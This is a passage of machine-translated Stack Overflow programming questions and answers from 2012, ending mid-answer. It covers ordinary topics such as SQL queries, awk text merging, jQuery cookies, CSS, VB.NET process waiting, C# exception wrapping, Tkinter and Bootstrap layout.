> 赞同：-2
> 
> 时间：2012-09-26T13:48:56.170
> 
> 标签：sql, oracle

我有两个不同的表 Value(queid, m) 和 Ans(queid1, an)。我想比较 queid 和 queid1，如果它们相同，则 m 和 an 的值，并且必须用正确的值更新第三个表。谢谢一吨。
表结构是
Value表，会有两个属性queid和m。queid 将具有类似 3、4、5、6 的数据，m 将具有 a、v、d、e
Ans 表将具有属性 queid1 和 an。queid1 属性将具有 3、4、3、4、3、3、3、2、3、4 之类的数据，而 an 将具有诸如 a、v、a、a、a、c、e、r、e、d 之类的数据.
现在我想要的是它应该将 queid 的值与 queid1 进行比较。所以如果我们考虑**3**即 value 表中 queid 的第一个值，那么它应该在**ans中找到所有****3****表然后是应该将**a**（即与值表中的3对应的行）与ans中**的所有3进行比较。****并且a**的相应右比较将存储在某个第三个表中。**

 *** * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-26T13:51:15.497

不完全确定我理解这个问题，但我会试一试：

```
 Update PsychiciallyDiscernedThirdTable
      set m=b.m, an=c.an
     from value b
     join ans c
       on b.queid=c.queid1 
```**

# regex - 匹配 2 个文件中的公共行并在正则表达式中编辑第二个文件

> ID：12603254
> 
> 赞同：2
> 
> 时间：2012-09-26T13:49:04.157
> 
> 标签：regex

我被困在最后一步，希望有人能帮助我。

我有 2 个文件：

文件1 =

> 青苹果

文件2 =

> 青苹果/数量/100
> 
> 红桃/数量/200

我的代码：

> grep -f 文件1 文件2 | sed 's/数量(.*)/totalXYZ/'
> 
> = 青苹果/totalXYZ

我想将它应用到 f​​ile2 所以结果看起来像这样：

文件2 =

> 青苹果/totalXYZ
> 
> 红桃/数量/200

谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-26T14:02:59.397

您可以通过以下方式使用 AWK 获取它：

```
awk -f grepandreplace.awk file2 file1 
```

“grepandreplace.awk”的代码是：

```
#!/usr/bin/awk -f
BEGIN {
    FS = "/";
    f_grep = ARGV[2];
    ARGC = 2;

    while ((getline < f_grep) > 0) {
        grep[$1] = "";
    }
}

{
    if ($1 in grep) {
        print $1"/totalXYZ";
    } else {
        print $0;
    }
} 
```

我得到了你想要的输出：

```
Green Apple/totalXYZ
Red Peach/quantity/200 
```

任何问题？给我留言。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-26T14:10:47.100

您可以使用 2 个 grep 在一行中获取它：第一个用于匹配，第二个使用反转匹配 (-v)。然后将第二个输出附加到第一个输出：

```
echo -e `grep -f file1 file2 | sed 's/quantity.*/totalXYZ/'`"\n"`grep -vf file1 file2` 
```

# jquery - 在访问特定 url 时使用 jQuery Cookie 触发 div 更改

> ID：12603263
> 
> 赞同：0
> 
> 时间：2012-09-26T13:49:26.500
> 
> 标签：jquery, html, cookies, javascript

以下代码运行良好，但我需要它仅在访问者登陆特定页面时才起作用，让我尝试更好地解释一下；

我有一封电子邮件，带有一个只有某些人才能获得的独家链接，当他们通过此链接登陆网站时，我希望我的粘滞栏改变 - （下面的当前代码根据对任何访问的任何访问更改粘滞栏页面，而不仅仅是某个页面）。

```
$(function() {
if(!$.cookie('repeatVisitor')) {
    // if the user is not a repeat visitor, set the cookie
    $.cookie("repeatVisitor", "true", { expires: 3 }); //expires in 3 days
}

if ($.cookie('repeatVisitor')) {
    // if the cookie exists, show the custom div
    setTimeout('showDivTwo();', 3000);
}
})

function showDivTwo() {
$('#sticky-bar').fadeOut();
$('#sticky-private').fadeIn();
} 
```

正如我发现的那样，正在设置 cookie，但没有什么可以触发代码仅通过特定的 URL 进行更改。我想到的一件事可能是将 #(hash) 绑定到给出的专有链接的末尾

我不希望更改依赖于网站上的一次点击，我只希望它仅根据对特定页面的访问自动进行。

有人可以帮忙吗？再次为这个问题的轻微重复道歉，尽管现在它是一个不同的curcumstance。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-26T19:47:00.430

您需要从当前会话中获取当前页面，

```
var sPath=window.location.pathname;
var sPage = sPath.substring(sPath.lastIndexOf('/') + 1); 
```

或类似的东西然后取 SPage 的值并将其与验证所需的任何内容进行比较。您必须有一个与某处（在数据库中、文件上等）的页面匹配的代码列表，或者如果用户正在访问同一页面，请将值存储在 cookie 中，以便我也可以被标记.

有很多方法可以解决这个问题，如果这有帮助，请告诉我。谢谢

# css - 在CSS中将边框设置为溢出的图像

> ID：12603267
> 
> 赞同：0
> 
> 时间：2012-09-26T13:49:44.237
> 
> 标签：css

这是一个例子：http: [//jsfiddle.net/7zhLm/5/](http://jsfiddle.net/7zhLm/5/)

里面的图片比 div 支持的要大。

因此，它正在裁剪其余部分 ( `overflow-x: hidden`)。

我正在尝试在图像周围创建一个白色边框，但它似乎不起作用。

在使用开发工具检查了那里发生的情况后，我看到下部覆盖了白色边框。

我该如何解决？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-26T13:56:26.630

我看到你同时使用`overflow-x`和`overflow-y`。您可以`overflow:hidden;`在任何浏览器上使用它，而`-x`旧`-y`版本不支持它。

无论如何，为避免它，您可以添加另一个`<div>`. 检查[现场演示](http://jsfiddle.net/gionaf/yDSBY/)，这里是更新的代码：

```
<div id="fixed_event_1" class="splashTabLogout" >
<div>
<img src="http://www.twospy.com/galleriffic/demo/Sample%202.jpg" width="300" />
</div>
</div>

.splashTabLogout {
    width: 300px;
    height: 100px;
    cursor: pointer;
    background: #fff;
    padding: 10px;
    /* border-radius and box-shadow stuff */
}
.splashTabLogout > div {
    max-width:100%;
    max-height:100%;
    overflow:hidden;
} 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-09-26T13:56:37.720

[JSFiddle](http://jsfiddle.net/7zhLm/6/) 您尝试使用填充设置边框。将其更改为 10 像素的白色边框。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-09-26T14:16:03.177

您拥有的 HTML 很好。它是语义的，简单的——不要改变它。更改有关它的详细信息，并修复 CSS，你会很高兴：http: [//jsfiddle.net/7zhLm/9/](http://jsfiddle.net/7zhLm/9/)

CSS

```
.splashTabLogout {
    border: white solid 10px;
    border-radius: 3px;
    box-shadow: rgba(0,0,0,.22) 0 2px 6px;
    overflow: hidden;
}

.splashTabLogout img { width:300px } 
```

HTML

```
<div id="fixed_event_1" class="splashTabLogout" >
    <img src="your-pic.jpg" />
</div> 
```

`img`注意：在标签内包含宽度/高度是有效的。时期。在图像库或其他任何地方，您可能有多个具有相同尺寸的图像，通常更容易，并且从 CSS 文件中声明宽度/高度的代码更少。供参考

# .net - 如何在 PropertyGrid 中为模态 UITypeEditor 重新标记省略号按钮？

> ID：12603269
> 
> 赞同：3
> 
> 时间：2012-09-26T13:49:44.830
> 
> 标签：.net, winforms, propertygrid, uitypeeditor

我有一个 Windows 窗体 PropertyGrid 和一个客户 UITypeEditor 每个[http://msdn.microsoft.com/en-us/library/system.drawing.design.uitypeeditoreditstyle.aspx](http://msdn.microsoft.com/en-us/library/system.drawing.design.uitypeeditoreditstyle.aspx)

> 显示省略号 (...) 按钮以启动模式对话框，在继续程序之前需要用户输入，或者显示无模式对话框，它保留在屏幕上，随时可用，但允许其他用户活动。

那个省略号按钮非常小。如何使用更有用的标签重新标记它？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-10-30T18:38:22.240

长话短说，你不能。基本的 MS PropertyGrid 不允许您自定义此文本。它甚至使用带有 3 个点的位图而不是文本，并且控件的宽度是固定的。

*免责声明：我是[Smart PropertyGrid.Net](http://www.visualhint.com/propertygrid)背后的开发人员，它可以做你想做的事情。*

# sql - 在 MS Access 中转置和聚合 SQL 查询

> ID：12603277
> 
> 赞同：3
> 
> 时间：2012-09-26T13:50:02.833
> 
> 标签：sql, ms-access, pivot, transpose

嗨，我正在寻求有关查询的帮助。我目前有一个看起来像这样的表：

```
 BP          I/E

AN02           I  
BN02           ECN  
EN89           ECN  
AN02           I  
BN02           ECC  
EN89           ECN  
AN02           ECC  
BN02           ECC  
EN89           ECN 
AN02           ECC  
BN02           ECN  
EN89           ECN 
AN02           I  
BN02           I 
EN89           ECN 
```

我正在寻找一个 SQL 查询来计算每个 BP 的 I、ECN 和 ECC 的数量。希望查询看起来像这样：

```
BP    I    ECN   ECC  

AN02  2    3      1
BN02  1    6      9
EN89  4    2      3 
```

任何人都可以帮忙吗？谢谢你

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-26T14:16:59.407

交叉表可能适合：

```
TRANSFORM Count(tbl.[I/E]) AS [CountOfI/E]
SELECT tbl.BP
FROM tbl
GROUP BY tbl.BP
PIVOT tbl.[I/E]; 
```

结果：

```
BP      ECC ECN I
AN02    2       3
BN02    2   2   1
EN89        5 
```

# vb.net - 等待过程完成

> ID：12603279
> 
> 赞同：5
> 
> 时间：2012-09-26T13:50:07.903
> 
> 标签：vb.net, visual-studio-2010, process

在继续执行下一行代码之前，有什么方法可以暂停进程或等待进程完成？

这是我当前压缩所有 PDF 然后删除的过程。目前，它在压缩完成之前删除文件。有没有办法暂停/等到该过程完成？

```
 Dim psInfo As New System.Diagnostics.ProcessStartInfo("C:\Program Files\7-Zip\7z.exe ", Arg1 + ZipFileName + PathToPDFs)
    psInfo.WindowStyle = ProcessWindowStyle.Hidden
    System.Diagnostics.Process.Start(psInfo)

    'delete remaining pdfs
    For Each foundFile As String In My.Computer.FileSystem.GetFiles("C:\Temp\", FileIO.SearchOption.SearchAllSubDirectories, "*.pdf")
        File.Delete(foundFile)
    Next 
```

* * *

## 回答 #1

> 赞同：14
> 
> 时间：2012-09-26T14:02:07.217

[Process.Start](http://msdn.microsoft.com/en-us/library/0w4h05yb.aspx)返回一个*Process*实例。正如其他人所提到的，您可以使用[WaitForExit()](http://msdn.microsoft.com/en-us/library/fb4aw7b8.aspx)方法，尽管您可能应该使用[WaitForExit(Integer)](http://msdn.microsoft.com/en-us/library/ty0d8k56.aspx)，其中包括一个超时，以防万一压缩过程出现问题。

所以你的代码会变成这样：

```
...
Dim zipper As System.Diagnostics.Process = System.Diagnostics.Process.Start(psInfo)
Dim timeout As Integer = 60000 '1 minute in milliseconds

If Not zipper.WaitForExit(timeout) Then
    'Something went wrong with the zipping process; we waited longer than a minute
Else
    'delete remaining pdfs
    ...
End If 
```

* * *

## 回答 #2

> 赞同：10
> 
> 时间：2012-09-26T13:53:14.643

你可以使用`process.WaitForExit`方法

WaitForExit 可以让当前线程等到关联进程退出。

链接： http: [//msdn.microsoft.com/fr-fr/library/system.diagnostics.process.waitforexit (v=vs.80).aspx](http://msdn.microsoft.com/fr-fr/library/system.diagnostics.process.waitforexit(v=vs.80).aspx)

* * *

## 回答 #3

> 赞同：4
> 
> 时间：2012-09-26T13:53:42.307

有几种 WaitForExit 方法可用。

查看[Process.WaitForExit](http://msdn.microsoft.com/en-us/library/system.diagnostics.process.waitforexit.aspx)。

> `WaitForExit()`使当前线程等待，直到关联的进程终止。应该在进程上调用所有其他方法之后调用它。为避免阻塞当前线程，请使用 [Exited](https://docs.microsoft.com/en-us/dotnet/api/system.diagnostics.process.exited?view=netframework-4.7.2)事件。
> 
> *   指示 Process 组件无限期地等待关联的进程退出。
> 
> `WaitForExit(Int32)`使当前线程等待，直到关联的进程终止。应该在进程上调用所有其他方法之后调用它。为避免阻塞当前线程，请使用 Exited 事件。
> 
> *   指示 Process 组件等待指定的毫秒数，以使关联的进程退出。

# .net - 实体框架 CodeFirst 将数据从一个表移动到另一个表

> ID：12603280
> 
> 赞同：0
> 
> 时间：2012-09-26T13:50:13.507
> 
> 标签：.net, asp.net-mvc-3, linq, c#-4.0, entity-framework-4.3

我正在为我的 Asp.Net Mvc3 应用程序使用实体框架（4.3）代码优先方法。我想做：在单击保存按钮 Tabla A 之后，必须将表 A 的数据（连同其他一些数据）复制到表 B Data will be Removed 这个怎么实现？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-26T14:46:22.917

以下是要采取的合乎逻辑的步骤。将以下内容添加到保存按钮的单击事件中：

1.  使用循环遍历表 A 中的每一行。
2.  循环时，将表 A 中的行信息以及必须复制的其他数据添加到表 B。
3.  验证表 B 中的数据是否包含您需要的信息
4.  使用循环再次遍历表 A 中的每一行，但这次删除每一行。

希望这可以帮助。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-26T15:33:39.103

也许您应该查看 Entity Framework Migrations，它是用于操作数据库模式的非常全面的工具。 [http://blogs.msdn.com/b/adonet/archive/2012/02/09/ef-4-3-code-based-migrations-walkthrough.aspx](http://blogs.msdn.com/b/adonet/archive/2012/02/09/ef-4-3-code-based-migrations-walkthrough.aspx)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-05T07:25:21.277

可能是这个解决方案帮助某人解决了这个问题@Tarzan帮助我完成了这个

```
IList<OrderTemp> data = _DBService.GetAllOrderTemp();//List

foreach (var result in data)
{
    Order order = new Order()
    {
        OrderId = result.Id,
        CustomerId = result.CustomerId,
        SchoolNameId = result.SchoolNameId,
        Supplier = result.Supplier,
        StatusId = result.StatusId,
        ProductCode = result.ProductCode,
        ProductDescription = result.ProductDescription,
        Color = result.Color,
        Size = result.Size
    };
    _DBService.InsertOrder(order);
    _DBService.DeleteOrderTemp(result);
} 
```

# android - 单击链接时发送邮件

> ID：12603293
> 
> 赞同：1
> 
> 时间：2012-09-26T13:51:04.393
> 
> 标签：android

这是我`Strings.xml`文件中的 html 元素。

```
<string name="five">
          <![CDATA[
         <HTML>
         <Body>
         <p>.................Some Text.......................

         <br><br>Feel free to contact us at<br> <font color="#add8e6">myemailid@gmail.com</font></p>
         </body>
         </HTML>
          ]]>
        </string> 
```

现在，当用户点击 时`myemailid@gmail.com`，我希望 yahoo 邮件或 gmail 或用户手机中存在的任何邮件应用程序打开并`myemailid@gmail.com`填写该`TO :`字段。这样的事情可能吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-26T13:53:40.243

当您设置可以使用的文本时（假设您已将字符串检索到一个名为 text 的变量中，并且正在引用一个名为 textView 的 TextView）

```
textView.setText(Html.fromHtml(text)); 
```

* * *

设置布局时，您还可以在包含五个字符串的视图上声明[android:autolink="email"](http://developer.android.com/reference/android/widget/TextView.html#attr_android%3aautoLink)。

自动链接的描述是“控制是否自动找到诸如 url 和电子邮件地址之类的链接并将其转换为可点击的链接。” 即，视图中的文本被解析，文本中的任何（在这种情况下）电子邮件地址都被转换为可点击的链接。

* * *

如果`android:autolink="email"`文本中的其他 Html 标记不会被处理，并且会像上面那样显示（而不是作为已处理的 HTML 文档）。

而`Html.fromHtml()`将处理 HTML 标签并处理格式正确的标签。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-26T13:55:44.470

看看 Androids [Linkify](http://developer.android.com/reference/android/text/util/Linkify.html)类。

例如，如果您执行以下操作：

```
Linkify.addLinks(myTextView, Linkify.EMAIL_ADDRESSES); 
```

文本视图中的任何电子邮件地址都将是可点击的，当点击时，将向用户显示一个适当的对话框。

当然，这是假设您的字符串实际上显示在`TextView`

# iphone - 所需的后台模式 iOS6 Xcode 4.5

> ID：12603294
> 
> 赞同：4
> 
> 时间：2012-09-26T13:51:06.297
> 
> 标签：iphone, xcode, ios6, xcode4.5

我注意到在 Xcode 4.5 和 iOS6 中“必需的背景模式”-“应用程序播放音频”不起作用！

如果有，其他人是否注意到了这一点，您是否找到了解决方法？

谢谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-26T16:47:38.653

我相信它可能取决于您为 AVAudioSession 指定的类别类型...确保`AVAudioSessionCategoryPlayback`在初始化会话时将其设置为。

# c# - 从 catch 块中抛出嵌套的异常......这是明智的吗？

> ID：12603295
> 
> 赞同：2
> 
> 时间：2012-09-26T13:51:09.650
> 
> 标签：c#, .net, exception, exception-handling

我想在我的库中实现自定义异常处理，以便我知道发生异常的位置，所以我这样做：

```
try
{
    DoSomething();
}
catch(Exception ex)
{
    //LibraryException refers to any exception in the libraries exception hierarchy
    throw new LibraryException(ex.Message, ex);
} 
```

*   应该避免这种情况吗？

*   它有任何性能影响吗？

*   捕获、嵌套和重新抛出异常的含义是什么？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-09-26T14:15:22.230

唯一的潜在问题是您正在捕获非特定的`Exception`，因此不符合[异常处理指南](http://msdn.microsoft.com/en-us/library/vstudio/ms229005(v=vs.100).aspx)。

以下其中一项将更符合这些准则：

```
try
{
    DoSomething();
}
catch(SomeException ex)
{
    throw new LibraryException(ex.Message, ex);
} 
```

或者：

```
try
{
    DoSomething();
}
catch(Exception ex)
{
    if (ex is SomeException || ex is SomeOtherException)
    {
        throw new LibraryException(ex.Message, ex);
    }
    throw;
} 
```

至于性能，一旦抛出异常，就会发生异常情况，您可能并不关心包装它的额外开销。

来自评论：

> 在大多数情况下，当库选择包装异常时，它将包装在库范围之外抛出的所有异常，...

我不同意这一点，尽管它确实是主观的。包装异常的库的一个示例是`SqlMembershipProvider`，它将一些特定的异常包装在 a 中`ProviderException`，例如：

```
try
{
    new Regex(this._PasswordStrengthRegularExpression);
}
catch (ArgumentException exception)
{
    throw new ProviderException(exception.Message, exception);
} 
```

但是其他异常（例如`SqlException`无法期望调用者处理的异常）会被展开传播。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-09-26T13:54:55.460

这是一个很好的做法，如果它为您的架构增加了抽象和/或清晰度。

它使异常更加明确，并且可能对较高层隐藏较低层的细节。例如，在数据访问层中，您可能会捕获 SqlExceptions 并改为抛出 DataAccessExceptions，这样较高层就不会“知道”您正在使用 SQL Server 作为数据存储。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-09-26T13:56:06.373

> 应该避免这种情况吗？

这是一个偏好问题。在某些情况下，它可能是有利的，在某些情况下可能是有害的，并且在大多数情况下两者兼而有之。在某些情况下，您会看到现有库已完成此操作，而其他库则选择不这样做。

> 它有任何性能影响吗？

可能，是的，但我怀疑它是否真的很重要。一开始并不便宜。

> 捕获、嵌套和重新抛出异常的含义是什么？

好处：

*   调用您的方法的人可以轻松捕获从您的库中抛出的异常。
*   对调用者隐藏库的实现细节。
*   允许调用者仅从您的库中轻松捕获异常。如果没有这个，如果他们试图捕获一个无效的参数异常，它可能来自您的库或他们的其他代码。他们可能只想捕获从其他地方抛出的参数异常。

缺点：

*   仅捕获可能从您的库中抛出的一种类型的异常而不捕获其他异常更难。
*   它在显示时给异常文本添加了很多混乱。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-09-26T13:57:49.897

好的，作为一个真正的快速概述，当在 try catch 块中捕获异常时，它必须收集整个堆栈以进行跟踪。抛出任何类型的异常实际上都是相当昂贵的，但是当你将 throws 嵌套在 catch 块内时，它会成倍增长。因此，实际上，只有在您确切知道抛出异常的原因并计划通过尝试处理它的情况下，您才应该抛出异常。这主要是在您创建 API 时出现的情况，并且无法预测其他开发人员可能如何使用您的库。

如果您正在为自己的应用程序编写代码，则应完全避免抛出异常，因为您只是将其抛给自己（基本上）。在这种情况下，您应该处理如果抛出异常而不是抛出您自己的异常会发生什么。

与 Python（我喜欢它，但范式不同）和其他“oops”语言不同，通过 C# 中的异常处理来控制流并不是一个好习惯。

[在 C# 下，try、throw 和 catch 块对性能的影响有多大](https://stackoverflow.com/questions/615955/under-c-sharp-how-much-of-a-performance-hit-is-a-try-throw-and-catch-block)

[支持或反对使用 try catch 作为逻辑运算符的论据](https://softwareengineering.stackexchange.com/questions/107723/arguments-for-or-against-using-try-catch-as-logical-operators)

[C#中的异常处理](http://www.dreamincode.net/forums/topic/177003-discussion-exception-handling-in-c%23/)

[C# 异常（检查这个）](http://www.dotnetperls.com/exception)

[CA1031：不捕获一般异常](http://msdn.microsoft.com/en-us/library/ms182137.aspx)

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2012-09-26T13:57:58.250

在上下文中，抛出更具体的异常通常是一个好主意，*前提*是 LibraryException 来自您自己的问题域并为开发人员提供更具体的信息，以便他们可以说“啊，库异常意味着某类发生错误。”

try-catch 确实强加了它们自己的性能开销，但我没有看到任何使这个块比任何其他类似块更糟糕的地方。

# c# - 优雅的 maxrequest 处理程序

> ID：12603301
> 
> 赞同：0
> 
> 时间：2012-09-26T13:51:34.420
> 
> 标签：c#, asp.net-mvc, upload, maxrequestlength

我的另一个问题。这不会是一件容易的事！

我在处理简单上传时遇到问题。测试的前置要求： - 无 Flash（劫持） - 基本上传字段使用 + 要发布的表单 - 最大文件大小为 20MB（web.config maxrequestlength） - 我正在使用内置的 IIS 开发工具以可视方式运行网站工作室（我认为） - 我正在使用 MVC Web 项目

问题：当文件大于 20MB 时，是否可以向用户显示一个很好的错误消息？（没有先将整个文件发送到服务器）

这些链接对我帮助最大：

[http://www.telerik.com/community/forums/aspnet/upload/maximum-request-length-exceeded.aspx](http://www.telerik.com/community/forums/aspnet/upload/maximum-request-length-exceeded.aspx)

[ASP.NET MVC：处理超过 maxRequestLength 的上传](https://stackoverflow.com/questions/6952051/asp-net-mvc-handling-upload-exceeding-maxrequestlength)

[http://forums.whirlpool.net.au/archive/809909](http://forums.whirlpool.net.au/archive/809909)

[http://forums.asp.net/t/1106579.aspx/1](http://forums.asp.net/t/1106579.aspx/1)

[捕获“超出最大请求长度”](https://stackoverflow.com/questions/665453/catching-maximum-request-length-exceeded)

但我仍然无法解决这个问题。Atm 我使用最后一个链接的接受答案的代码（[捕获“超出最大请求长度”](https://stackoverflow.com/questions/665453/catching-maximum-request-length-exceeded)），但是当我运行下面的代码行时我的代码崩溃：

```
this.Server.Transfer("~/error/UploadTooLarge.aspx"); 
```

错误消息：执行 ~/error/UploadTooLarge.aspx 的子请求时出错。

我想我收到这条消息是因为我正在使用 VS.NET 的内置 Web 服务器（请参阅：[http](http://forums.asp.net/t/1106579.aspx/1) ://forums.asp.net/t/1106579.aspx/1该页面的最后一篇文章）。

我很害怕我让整个问题有点难以阅读。简而言之：当我上传的文件太大（使用 S.NET 的内置 Web 服务器）时，如何显示简洁的错误消息？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-27T10:09:41.497

如果您不想先将整个文件发送到服务器，那么您唯一的选择就是 javascript。FileReader 对象将为您解决这个 问题[https://developer.mozilla.org/en-US/docs/DOM/FileReader](https://developer.mozilla.org/en-US/docs/DOM/FileReader) 问题是它不适用于旧版浏览器。现在，如果较旧的浏览器对您来说不是问题，那么您应该找到大量教程，向您展示如何使用 FileReader 对象。有了它，您可以进行异步上传，因此考虑到文件相当大，您甚至可以添加一个不错的进度条。

# python - Python TkInter Checkbutton 不起作用

> ID：12603303
> 
> 赞同：0
> 
> 时间：2012-09-26T13:51:43.657
> 
> 标签：python, tkinter

请帮我。这很奇怪。看这个：

```
#!/usr/bin/env python
from Tkinter import *
import database

def insertBook():
 insertWindow = Tk()
 insertWindow.title("Inserisci un nuovo romanzo nel database")

 checkvars = []
 checkvars.append(IntVar())
 checkvars.append(IntVar())

 Checkbutton(insertWindow, text = 'male', variable=checkvars[0]).pack()
 Checkbutton(insertWindow, text = 'female', variable=checkvars[1]).pack()
 Button(insertWindow, text= 'show', command=lambda: show(checkvars)).pack()

 insertWindow.mainloop()

def show(checkvars):
 print checkvars[0].get()
 print checkvars[1].get()

class AppBase:
def __init__(self, parent):

    self.quadro1 = Frame(parent)
    self.quadro1.pack()
    self.welcolmeLabel = Label(self.quadro1, text = "Benvenuto nel database dei romanzi di Lory")
    self.welcolmeLabel.pack()

    self.insertButton = Button(self.quadro1, command = insertBook);
    self.insertButton["borderwidth"] = 1
    self.insertButton["text"] = "Inserisci un libro nel database"
    self.insertButton["background"] = "pink"
    self.insertButton.pack(side = "left")

    self.quadro2 = Frame(parent)
    self.quadro2.pack()

    self.searchButton = Button(self.quadro1);
    self.searchButton["borderwidth"] = 1
    self.searchButton["text"] = "Ricerca nel database"
    self.searchButton["background"] = "blue"
    self.searchButton.pack(side = "left")

    self.showButton = Button(self.quadro1);
    self.showButton["borderwidth"] = 1
    self.showButton["text"] = "Mostra i generi di libro"
    self.showButton["background"] = "violet"
    self.showButton.pack(side = "left")

    self.exitButton = Button(self.quadro2, text = "Uscita", borderwidth = 1, background = "red", command = self.quadro1.quit)
    self.exitButton.pack(side = RIGHT, pady = 20)

if __name__ == '__main__':

 mainFinestra = Tk()
 mainFinestra.title('Database di Romanzi')
 app = AppBase(mainFinestra)

 listvars = []
 listvars.append(IntVar())
 listvars.append(IntVar())

 Checkbutton(mainFinestra, text = 'male', variable=listvars[0]).pack()
 Checkbutton(mainFinestra, text = 'female', variable=listvars[1]).pack()
 Button(mainFinestra, text= 'show', command=lambda: show(listvars)).pack()

 mainFinestra.mainloop() 
```

似乎检查按钮变量仅在 mainFinestra 中设置。如果我在另一个新窗口（例如 insertWindow）中创建检查按钮，则 checkvars 中的变量始终为 0，即使这些按钮被选中。相反，如果我尝试检查 mainFinestra 中的检查按钮，则函数“show”如果被检查则返回 1。有什么不同？拜托，这个项目对我很重要。谢谢

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-26T13:56:17.873

您正在做一些 Tkinter 不打算做的事情——您正在创建该类的两个实例`Tk`。您应该只创建一个实例，并且只启动一个事件循环。

如果您需要多个窗口，请创建`Tkinter.Toplevel`.

# android - 让 linux 在运行 WinCE 的汽车音响设备上运行

> ID：12603305
> 
> 赞同：0
> 
> 时间：2012-09-26T13:51:44.957
> 
> 标签：android, linux, windows-ce

我有一个汽车音响（Pioneer AppRadio2），它似乎有一个包含用于 MIPS 的 WindowsCE 的 ROM。

是否可以通过将 linux 类型的 ROM 闪存到设备上来在设备上运行 Linux/Andriod ？

如果可能的话，实现这一目标需要采取哪些高级步骤？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-26T14:27:06.687

Pioneer 确实有一个AppRadio 的[移动开发者网站](http://www.appradiodev.com/)，但它还没有上线，所以看起来 Pioneer 不会立即提供帮助。

您需要确定引导加载程序是否被某种数字签名锁定。如果它经过数字签名和锁定，您将不得不从 Pioneer 获取密钥或对其进行逆向工程。

[之后，使用OpenEmbedded](http://www.openembedded.org/wiki/Main_Page)等嵌入式工具包在设备上创建 Linux 环境。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-26T15:35:03.657

那不会那么容易。实际上，它旨在成为 android 和 iphone 设备的控制站。因此，您现在可以只使用手机的 android 套件并从 appradio2 控制它。我知道你的收音机不会运行 android 本身，但会显示和控制它。

由于它是相当新的，如果可能的话，开发人员需要一些时间来“破解”它。我在 xda 上看到过赏金，例如，那些想要你所要求的东西和其他东西的人。

# css - 引导响应剪切页脚背景

> ID：12603306
> 
> 赞同：1
> 
> 时间：2012-09-26T13:51:45.267
> 
> 标签：css, twitter-bootstrap, responsive-design

我有问题。我使用 Twitter Bootstrap 作为我的网站[http://www.bouq.de](http://www.bouq.de)的框架。现在我启用了响应功能。当我在宽度为 320 像素的智能手机上查看该网站或将浏览器窗口缩放到小尺寸时，页脚的背景将被切割，边距约为 20 像素。但我想让页脚背景全宽显示。

就像你用[http://twitter.github.com/bootstrap/](http://twitter.github.com/bootstrap/)做同样的过程一样，它不会把边距放在页脚背景上。

我现在不太确定怎么做这个:)

这是我的页脚代码

```
<footer>
<section class="footer-top">
    <div class="container" >
        <div class="row">
            <div class="span4">
                <div class="bouq-footer-desc-wrapper">
                    <img src="<?php bloginfo( 'template_url' );?>/img/bouq-logo-footer.png" />
                    <p class="bouq-footer-desc">bouq. ist eine kreative Künstlerplattform mit familiärem Charakter, fokussiert auf die Produktion und Vermarktung von anspruchsvoller, elektronischer Musik und der damit verbundenen Kultur.</p>
                </div>
            </div>
            <div class="span4">
                <?php if ( function_exists('dynamic_sidebar')) dynamic_sidebar("footer-left"); ?>
            </div>
            <div class="span4">
                <?php if ( function_exists('dynamic_sidebar')) dynamic_sidebar("footer-right"); ?>
            </div>

        </div>
    </div>
</section>
<section class="footer-bottom">
    <div class="container" >
        <div class="row">
            <div class="span12">
                <div class="law">
                    <a href="/impressum">Impressum</a> | <a href="mailto:info@bouq.de">Kontakt</a> | &copy; bouq. c/o Level Eins <?php the_time('Y') ?> | designed by <a href="http://www.upplex.de" target="_blank" rel="tooltip" data-placement="top" title="Webdesign by upplex.de" >upplex</a>  <p class="pull-right"><a href="#">Nach oben</a></p>
                </div>
            </div>
        </div>
    </div>
</section> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-27T00:02:59.080

On line 964 in your responsive CSS, upplex-framework-responsive.min.css, you have the following declaration:

```
 @media (max-width:767px) { body { 
  padding-left: 20px; 
  padding-right: 20px; 
  }} 
```

This is giving anything from 767px a margin on either side of the body. You need to remove/override this.

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-27T01:29:02.440

好的，我修好了:)

```
 footer,   .page-title-container {
    margin-left: -20px;
    margin-right: -20px;   }

.page-title-container-wrapper,   .bouq-footer-ext {     padding: 0px 10px 0px 10px;   } 
```

只需在第二个包装器中添加填充

# .net - 将字节数组转换为javascript中的原始文件

> ID：12603307
> 
> 赞同：0
> 
> 时间：2012-09-26T13:51:45.540
> 
> 标签：.net, wcf, download, client, bytearray

我正在发送一个字节数组，它最初是数据库中的二进制文件。发送字节数组的过程很好，但问题是我该如何处理这个字节数组。

1）我可以使用javascript处理它吗，我的意思是我可以检索字节数组并将其转换回原始状态。如果是的话怎么办？

2）如果没有其他方法我可以做到这一点。

我想要做的是让客户端能够在不使用流的情况下从 WCF 下载文件，我不需要流，因为我知道下载和上传的文件很小。

# c++ - 是否可以在 C++ 中放大控制台中的文本

> ID：12603313
> 
> 赞同：0
> 
> 时间：2012-09-26T13:51:57.473
> 
> 标签：c++, text

我只是想知道您是否可以在 C++ 中放大控制台文本，因为我正在编写一个游戏，并且我希望将游戏标题放大打印出来，以给人一种真正基于文本的冒险游戏的感觉。

* * *

## 回答 #1

> 赞同：4
> 
